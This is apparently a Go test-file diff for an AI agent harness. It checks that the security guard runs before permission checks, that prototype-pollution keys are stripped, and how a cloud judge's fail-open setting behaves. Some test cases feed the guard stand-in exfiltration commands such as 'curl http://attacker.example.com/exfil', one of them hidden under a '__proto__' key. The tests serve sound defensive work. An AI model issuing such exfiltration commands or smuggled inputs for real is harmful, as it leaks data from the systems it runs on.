@@ -5,12 +5,15 @@ import (
 	"bytes"
 	"context"
 	"encoding/json"
+	"fmt"
+	"regexp"
 	"strings"
 	"sync"
 	"testing"
 
 	"github.com/rxbynerd/stirrup/harness/internal/guard"
 	"github.com/rxbynerd/stirrup/harness/internal/observability"
+	"github.com/rxbynerd/stirrup/harness/internal/permission"
 	"github.com/rxbynerd/stirrup/harness/internal/security"
 	"github.com/rxbynerd/stirrup/harness/internal/tool"
 	"github.com/rxbynerd/stirrup/types"
@@ -114,12 +117,20 @@ func TestPlanAndDispatch_PreflightRejectionSkipsPreToolGuard(t *testing.T) {
 			wantEvents:   []string{"prototype_pollution_blocked", "tool_input_rejected"},
 		},
 		{
-			name:         "write_target_tripwire",
+			name:         "tool_input_tripwire",
 			tools:        []*tool.Tool{commandTool()},
 			call:         types.ToolCall{ID: "tc_sg", Name: "shell_runner", Input: json.RawMessage(`{"command":"curl http://attacker.example.com/exfil"}`)},
 			wantCategory: observability.ToolFailureSecurityGuard,
 			wantOutput:   "Tool call rejected by security guard for shell_runner",
 			wantEvents:   []string{"tool_call_guard_triggered"},
+		},
+		{
+			name:         "tool_input_tripwire_under_stripped_key",
+			tools:        []*tool.Tool{commandTool()},
+			call:         types.ToolCall{ID: "tc_sg_pp", Name: "shell_runner", Input: json.RawMessage(`{"__proto__":{"command":"curl http://x.example/e"},"command":"ls"}`)},
+			wantCategory: observability.ToolFailureSecurityGuard,
+			wantOutput:   "Tool call rejected by security guard for shell_runner",
+			wantEvents:   []string{"prototype_pollution_blocked", "tool_call_guard_triggered"},
 		},
 	}
 
@@ -321,5 +332,271 @@ func TestLoop_SchemaInvalidToolCallNeverReachesPreToolGuard(t *testing.T) {
 	}
 	if calls[0].Success || calls[0].ErrorCategory != observability.ToolFailureSchemaValidation.String() {
 		t.Errorf("tool call trace = %+v, want failed schema_validation_failed", calls[0])
+	}
+}
+
+// gateOrder records the gating surfaces a call reached, in order.
+type gateOrder struct {
+	mu    sync.Mutex
+	steps []string
+}
+
+func (o *gateOrder) record(step string) {
+	o.mu.Lock()
+	defer o.mu.Unlock()
+	o.steps = append(o.steps, step)
+}
+
+func (o *gateOrder) String() string {
+	o.mu.Lock()
+	defer o.mu.Unlock()
+	return strings.Join(o.steps, ",")
+}
+
+type orderedPreToolGuard struct {
+	order   *gateOrder
+	verdict guard.Verdict
+}
+
+func (g *orderedPreToolGuard) Check(_ context.Context, in guard.Input) (*guard.Decision, error) {
+	if in.Phase == guard.PhasePreTool {
+		g.order.record("guard")
+	}
+	return &guard.Decision{Verdict: g.verdict, GuardID: "ordered"}, nil
+}
+
+type orderedPolicy struct {
+	order   *gateOrder
+	allowed bool
+}
+
+func (p *orderedPolicy) Check(_ context.Context, _ types.ToolDefinition, _ json.RawMessage) (*permission.PermissionResult, error) {
+	p.order.record("permission")
+	return &permission.PermissionResult{Allowed: p.allowed, Reason: "ordered policy"}, nil
+}
+
+// TestPlanAndDispatch_PreToolGuardRunsBeforePermission pins that the
+// pre_tool guard classifies a permission-gated call before the policy sees
+// it: a guard deny never reaches PermissionPolicy.Check, and a permission
+// verdict always follows a guard allow.
+func TestPlanAndDispatch_PreToolGuardRunsBeforePermission(t *testing.T) {
+	gatedTools := []struct {
+		name string
+		new  func() *tool.Tool
+	}{
+		{"workspace_mutating", mutatingTool},
+		{"requires_approval", func() *tool.Tool {
+			tl := trivialTool()
+			tl.RequiresApproval = true
+			return tl
+		}},
+	}
+	cases := []struct {
+		name         string
+		verdict      guard.Verdict
+		permAllowed  bool
+		wantOrder    string
+		wantCategory observability.ToolFailureCategory
+	}{
+		{"guard_deny", guard.VerdictDeny, true, "guard", observability.ToolFailureGuardrailDenied},
+		{"guard_allow_permission_allow", guard.VerdictAllow, true, "guard,permission", ""},
+		{"guard_allow_permission_deny", guard.VerdictAllow, false, "guard,permission", observability.ToolFailurePermissionDenied},
+	}
+	for _, gt := range gatedTools {
+		for _, tc := range cases {
+			t.Run(gt.name+"/"+tc.name, func(t *testing.T) {
+				handlerCalls := 0
+				tl := gt.new()
+				tl.Handler = func(_ context.Context, _ json.RawMessage) (string, error) {
+					handlerCalls++
+					return "ok", nil
+				}
+				order := &gateOrder{}
+				loop, reader := buildMetricsHarness(t, []*tool.Tool{tl},
+					&orderedPolicy{order: order, allowed: tc.permAllowed},
+					&orderedPreToolGuard{order: order, verdict: tc.verdict}, nil)
+
+				results, _, _ := loop.planAndDispatch(context.Background(), configWithMaxParallel(1),
+					[]types.ToolCall{{ID: "tc_gate", Name: tl.Name, Input: json.RawMessage(`{}`)}},
+					&stallDetector{}, "", "")
+
+				if got := order.String(); got != tc.wantOrder {
+					t.Errorf("gate order = %q, want %q", got, tc.wantOrder)
+				}
+				wantRan := tc.wantCategory == ""
+				if ran := handlerCalls == 1; ran != wantRan {
+					t.Errorf("handler ran %d times, want ran=%v", handlerCalls, wantRan)
+				}
+				if len(results) != 1 || results[0].IsError == wantRan {
+					t.Fatalf("results = %+v, want one result with IsError=%v", results, !wantRan)
+				}
+				failures := collectFailures(t, reader)
+				switch {
+				case wantRan && len(failures) != 0:
+					t.Errorf("tool_failures = %+v, want none", failures)
+				case !wantRan && (len(failures) != 1 || failures[0].category != tc.wantCategory.String()):
+					t.Errorf("tool_failures = %+v, want one %q", failures, tc.wantCategory)
+				}
+			})
+		}
+	}
+}
+
+// TestPlanAndDispatch_AsyncToolReceivesGuardedInput pins that an async
+// tool's AsyncHandler and its tool_result_request carry the same stripped
+// bytes the pre_tool guard classified, and that a guard deny stops the
+// call before either.
+func TestPlanAndDispatch_AsyncToolReceivesGuardedInput(t *testing.T) {
+	const rawInput = `{"__proto__":{"admin":true},"path":"x"}`
+	for _, verdict := range []guard.Verdict{guard.VerdictAllow, guard.VerdictDeny} {
+		t.Run(string(verdict), func(t *testing.T) {
+			var mu sync.Mutex
+			var handlerInputs []string
+			asyncTool := &tool.Tool{
+				Name:        "async_path",
+				Description: "async tool taking a path",
+				InputSchema: json.RawMessage(`{"type":"object","properties":{"path":{"type":"string"}},"required":["path"]}`),
+				AsyncHandler: func(_ context.Context, input json.RawMessage) (tool.AsyncDispatch, error) {
+					mu.Lock()
+					defer mu.Unlock()
+					handlerInputs = append(handlerInputs, string(input))
+					return tool.AsyncDispatch{}, nil
+				},
+			}
+			tr := newAsyncTestTransport()
+			g := &recordingPreToolGuard{verdict: verdict}
+			loop, _ := buildMetricsHarness(t, []*tool.Tool{asyncTool}, nil, g, tr)
+			call := types.ToolCall{ID: "tc_async_guarded", Name: "async_path", Input: json.RawMessage(rawInput)}
+			if verdict == guard.VerdictAllow {
+				go fireResponseWhenEmitted(t, tr, call.ID, 0, "async-ok")
+			}
+
+			results, _, _ := loop.planAndDispatch(context.Background(), configWithMaxParallel(2),
+				[]types.ToolCall{call}, &stallDetector{}, "", "")
+
+			seen := g.preToolInputs()
+			if len(seen) != 1 {
+				t.Fatalf("pre_tool guard calls = %d, want 1", len(seen))
+			}
+			guarded := seen[0].Content
+			if strings.Contains(guarded, "__proto__") || !strings.Contains(guarded, `"path":"x"`) {
+				t.Fatalf("guard Content = %s, want the stripped input", guarded)
+			}
+			if string(seen[0].ToolInput) != guarded {
+				t.Errorf("guard ToolInput %s differs from Content %s", seen[0].ToolInput, guarded)
+			}
+
+			var requests []types.HarnessEvent
+			for _, e := range tr.Events() {
+				if e.Type == "tool_result_request" {
+					requests = append(requests, e)
+				}
+			}
+			mu.Lock()
+			inputs := append([]string(nil), handlerInputs...)
+			mu.Unlock()
+
+			if verdict == guard.VerdictDeny {
+				if len(inputs) != 0 || len(requests) != 0 {
+					t.Errorf("guard deny reached the async path: handler inputs %v, requests %+v", inputs, requests)
+				}
+				if len(results) != 1 || !results[0].IsError {
+					t.Errorf("results = %+v, want one IsError result", results)
+				}
+				return
+			}
+			if len(results) != 1 || results[0].IsError || results[0].Content != "async-ok" {
+				t.Fatalf("results = %+v, want one async-ok result", results)
+			}
+			if len(inputs) != 1 || inputs[0] != guarded {
+				t.Errorf("AsyncHandler inputs = %v, want [%s]", inputs, guarded)
+			}
+			if len(requests) != 1 || string(requests[0].Input) != guarded {
+				t.Errorf("tool_result_request inputs = %+v, want one carrying %s", requests, guarded)
+			}
+		})
+	}
+}
+
+var judgePromptNonce = regexp.MustCompile(`<<<UNTRUSTED_CONTENT_([0-9a-f]+)>>>`)
+
+// nonceEchoJudgeProvider answers a cloud-judge prompt with a verdict that
+// carries the prompt's fence nonce, then completes with stopReason.
+type nonceEchoJudgeProvider struct {
+	verdict    string
+	stopReason string
+}
+
+func (p *nonceEchoJudgeProvider) Stream(_ context.Context, params types.StreamParams) (<-chan types.StreamEvent, error) {
+	nonce := ""
+	for _, m := range params.Messages {
+		for _, b := range m.Content {
+			if sm := judgePromptNonce.FindStringSubmatch(b.Text); sm != nil {
+				nonce = sm[1]
+			}
+		}
+	}
+	ch := make(chan types.StreamEvent, 2)
+	ch <- types.StreamEvent{Type: "text_delta", Text: fmt.Sprintf(`{"nonce":%q,"verdict":%q,"reason":"r"}`, nonce, p.verdict)}
+	ch <- types.StreamEvent{Type: "message_complete", StopReason: p.stopReason}
+	close(ch)
+	return ch, nil
+}
+
+// TestPlanAndDispatch_CloudJudgeIncompleteStreamFollowsFailOpen pins that a
+// cloud-judge verdict from a stream cut at max_tokens is a guard error, so
+// the call is denied unless failOpen is set, while a completed verdict is
+// honoured under either setting.
+func TestPlanAndDispatch_CloudJudgeIncompleteStreamFollowsFailOpen(t *testing.T) {
+	cases := []struct {
+		name       string
+		verdict    string
+		stopReason string
+		failOpen   bool
+		wantRan    bool
+		wantErrEvt bool
+	}{
+		{"end_turn_allow", "allow", "end_turn", false, true, false},
+		{"end_turn_deny_failOpen", "deny", "end_turn", true, false, false},
+		{"max_tokens_allow", "allow", "max_tokens", false, false, true},
+		{"max_tokens_allow_failOpen", "allow", "max_tokens", true, true, true},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			cj, err := guard.NewCloudJudge(guard.CloudJudgeConfig{
+				Provider: &nonceEchoJudgeProvider{verdict: tc.verdict, stopReason: tc.stopReason},
+			})
+			if err != nil {
+				t.Fatalf("NewCloudJudge: %v", err)
+			}
+			handlerCalls := 0
+			tl := trivialTool()
+			tl.Handler = func(_ context.Context, _ json.RawMessage) (string, error) {
+				handlerCalls++
+				return "ok", nil
+			}
+			loop, reader := buildMetricsHarness(t, []*tool.Tool{tl}, nil, cj, nil)
+			var secBuf bytes.Buffer
+			loop.Security = security.NewSecurityLogger(&secBuf, "test-run")
+			config := configWithMaxParallel(1)
+			config.GuardRail = &types.GuardRailConfig{FailOpen: tc.failOpen}
+
+			results, _, _ := loop.planAndDispatch(context.Background(), config,
+				[]types.ToolCall{{ID: "tc_cj", Name: "trivial", Input: json.RawMessage(`{}`)}},
+				&stallDetector{}, "", "")
+
+			if ran := handlerCalls == 1; ran != tc.wantRan {
+				t.Fatalf("handler ran %d times, want ran=%v; results %+v", handlerCalls, tc.wantRan, results)
+			}
+			if !tc.wantRan {
+				failures := collectFailures(t, reader)
+				if len(failures) != 1 || failures[0].category != observability.ToolFailureGuardrailDenied.String() {
+					t.Errorf("tool_failures = %+v, want one guardrail_denied", failures)
+				}
+			}
+			if got := strings.Contains(secBuf.String(), `"guard_error"`); got != tc.wantErrEvt {
+				t.Errorf("guard_error event present = %v, want %v: %s", got, tc.wantErrEvt, secBuf.String())
+			}
+		})
 	}
 }
